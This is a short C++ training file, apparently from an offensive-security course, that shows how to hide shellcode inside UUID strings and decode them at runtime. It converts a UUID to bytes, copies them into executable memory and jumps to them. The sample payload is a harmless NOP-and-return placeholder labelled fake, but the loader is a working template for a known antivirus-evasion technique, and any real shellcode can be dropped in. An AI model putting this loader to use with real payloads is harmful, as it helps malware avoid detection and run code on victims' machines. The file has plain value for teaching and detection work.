// Filename: uuid_shellcode.cpp
// Purpose: Encode shellcode as UUID strings and decode at runtime.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <rpc.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")

void DecodeAndExecute(const char* uuidStr) {
    UUID uuid;
    UuidFromStringA((RPC_CSTR)uuidStr, &uuid);
    BYTE* sc = (BYTE*)&uuid;

    void* mem = VirtualAlloc(0, 16, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc, 16);
    ((void(*)())mem)();
}

int main() {
    DecodeAndExecute("90909090-9090-9090-9090-9090909090C3"); // fake shellcode in UUID
    return 0;
}
